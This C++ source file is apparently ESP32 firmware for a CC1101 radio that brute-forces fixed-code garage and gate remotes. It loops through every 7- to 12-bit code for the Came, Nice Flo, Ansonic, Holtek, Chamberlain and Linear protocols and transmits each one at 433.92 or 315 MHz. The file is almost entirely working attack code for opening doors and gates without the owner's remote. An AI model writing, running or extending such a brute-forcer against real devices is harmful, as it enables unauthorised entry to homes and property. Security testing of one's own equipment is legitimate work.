#include "brute.h"
#include "modules/RF/CC1101.h"
#define DEBUG_ENABLED 1



namespace BRUTE {
CC1101_CLASS cc1101;
int16_t counter = 0;
bool sendingFlag = false;

bool CC1101_BRUTE::Came12BitBrute()
{
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    encoderState = EncoderStepStart;    
 //   Serial.println(F("Came12BitBrute"));
    int i = 0;
        counter = 0;

    while(i < 4097 ) {
    i++;
 //   Serial.println(i);
    encoderState = EncoderStepStart;
    while(encoderState != EncoderStepReady){
    cameProtocol.yield(i);
    }

    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
                Serial.println("sending");
                gpio_set_level(CC1101_CCGDO0A, HIGH);
                delayMicroseconds(samplesToSend[j]); 
                gpio_set_level(CC1101_CCGDO0A, LOW);
                delayMicroseconds(samplesToSend[j+1]);                 
        }
            gpio_set_level(CC1101_CCGDO0A, LOW);
 
    counter++;
    }
    sendingFlag = false;
   return true;
}

bool CC1101_BRUTE::Nice12BitBrute()
{
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    encoderState = EncoderStepStart;    
    int i = 0;
        counter = 0;

    while(i < 4097 ) {
    i++;
    encoderState = EncoderStepStart;
    while(encoderState != EncoderStepReady){
    niceFloProtocol.yield(i);
    }

    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
                
                gpio_set_level(CC1101_CCGDO0A, HIGH);
                delayMicroseconds(samplesToSend[j]); 
                gpio_set_level(CC1101_CCGDO0A, LOW);
                delayMicroseconds(samplesToSend[j+1]);                 
        }
            gpio_set_level(CC1101_CCGDO0A, LOW);
    counter++;
    }
    sendingFlag = false;
   return true;
}

bool CC1101_BRUTE::Ansonic12BitBrute()
{
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    encoderState = EncoderStepStart;    
    int i = 0;
    counter = 0;

    while(i < 4097) {
        i++;
        encoderState = EncoderStepStart;
        while(encoderState != EncoderStepReady) {
            ansonicProtocol.yield(i);
            Serial.println("loop");
        }

        for (size_t j = 0; j < samplesToSend.size(); j += 1) {
           
            Serial.println(samplesToSend[j]);

        }

        for (size_t j = 0; j < samplesToSend.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samplesToSend[j]);
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samplesToSend[j+1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        counter++;
    }
    sendingFlag = false;
    return true;
}





bool CC1101_BRUTE::Holtek12BitBrute() {
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    int i = 0;
    counter = 0;
    // Brute-force all 12-bit keys (0 .. 4095)
    while(i < 4096) {
        i++;
        // Reset the protocol encoder state for each new attempt.
        encoderState = EncoderStepStart;
        // Call yield until the protocol’s state machine reaches Ready.
        while(encoderState != EncoderStepReady) {
            holtekProtocol.yield(i);
            Serial.println("loop");
        }
        // Retrieve the generated pulses (upload buffer) and send them.
        const std::vector<uint32_t>& pulses = holtekProtocol.getSamplesToSend();
        for(size_t j = 0; j < pulses.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(pulses[j]);
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(pulses[j+1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        counter++;
    }
    sendingFlag = false;
    return true;
}

bool CC1101_BRUTE::ChamberlainCodeBrute(uint8_t bitCount) {
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    // Ensure transmission starts HIGH (like in Came)
    digitalWrite(CC1101_CCGDO0A, HIGH);
    // For Chamberlain codes, use an appropriate frequency (e.g. 315 MHz)
    cc1101.setFrequency(315.0);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();

    // Maximum code depends on bitCount: (2^bitCount)
    uint32_t maxCode = 1UL << bitCount;
    for (uint32_t code = 0; code < maxCode; code++) {
        encoderState = EncoderStepStart;
        // Repeatedly call yield() until the protocol is ready.
        while (encoderState != EncoderStepReady) {
            chamberlainProtocol.yield(code, bitCount);
        }
        // Now the samples are ready in samplesToSend.
        Serial.print("Sending Chamberlain ");
        Serial.print(bitCount);
        Serial.print("-bit code: 0x");
        Serial.print(code, HEX);
        Serial.print(" Samples: ");
        for (size_t j = 0; j < samplesToSend.size(); j++) {
            Serial.print(samplesToSend[j]);
            Serial.print(",");
        }
        Serial.println();

        // Transmit pulses: each pair of durations represents a HIGH then LOW pulse.
        for (size_t j = 0; j < samplesToSend.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samplesToSend[j]);
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samplesToSend[j + 1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        delayMicroseconds(10);
    }
    sendingFlag = false;
    return true;
}

    
    bool CC1101_BRUTE::Chamberlain7BitBrute() {
    #if DEBUG_ENABLED
        Serial.println("Chamberlain7BitBrute: Invoking ChamberlainCodeBrute with 7 bits");
    #endif
        return ChamberlainCodeBrute(7);
    }
    
    bool CC1101_BRUTE::Chamberlain8BitBrute() {
    #if DEBUG_ENABLED
        Serial.println("Chamberlain8BitBrute: Invoking ChamberlainCodeBrute with 8 bits");
    #endif
        return ChamberlainCodeBrute(8);
    }
    
    bool CC1101_BRUTE::Chamberlain9BitBrute() {
    #if DEBUG_ENABLED
        Serial.println("Chamberlain9BitBrute: Invoking ChamberlainCodeBrute with 9 bits");
    #endif
        return ChamberlainCodeBrute(9);
    }
    
    bool CC1101_BRUTE::Linear10BitBrute() {
    #if DEBUG_ENABLED
        Serial.println("Linear10BitBrute: Starting brute force for 10-bit Linear protocol");
    #endif
        sendingFlag = true;
        pinMode(CC1101_CCGDO0A, OUTPUT);
        digitalWrite(CC1101_CCGDO0A, LOW);
    #if DEBUG_ENABLED
        Serial.println("Linear10BitBrute: Pin configured and set LOW");
    #endif
        cc1101.setFrequency(433.92);
        cc1101.setCC1101Preset(AM650);
        cc1101.loadPreset();
        cc1101.initRaw();
    #if DEBUG_ENABLED
        Serial.println("Linear10BitBrute: CC1101 configuration complete");
    #endif
    
        // For 10-bit linear protocol, brute-force codes from 0 to 1023.
        uint32_t maxCode = 1U << 10;
        for (uint32_t code = 0; code < maxCode; code++) {
    #if DEBUG_ENABLED
            Serial.print("Linear10BitBrute: Sending code ");
            Serial.println(code, DEC);
    #endif
            linearProtocol.startEncoding(code, 10);
    #if DEBUG_ENABLED
            Serial.print("Linear10BitBrute: Encoded sample count: ");
            Serial.println(linearProtocol.getEncodedSamples().size(), DEC);
    #endif
            const std::vector<long long int>& samples = linearProtocol.getEncodedSamples();
            for (size_t j = 0; j < samples.size(); j += 2) {
    #if DEBUG_ENABLED
                Serial.print("Linear10BitBrute: Pulse pair [");
                Serial.print(j);
                Serial.print("]: high=");
                Serial.print(samples[j]);
                Serial.print(", low=");
                Serial.println(samples[j + 1]);
    #endif
                gpio_set_level(CC1101_CCGDO0A, HIGH);
                delayMicroseconds(samples[j]);
                gpio_set_level(CC1101_CCGDO0A, LOW);
                delayMicroseconds(samples[j + 1]);
            }
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(1000);
    #if DEBUG_ENABLED
            Serial.println("Linear10BitBrute: Code sent");
    #endif
            counter++;
        }
        sendingFlag = false;
    #if DEBUG_ENABLED
        Serial.print("Linear10BitBrute: Completed brute force, total codes sent: ");
        Serial.println(counter);
    #endif
        return true;
    }
}
    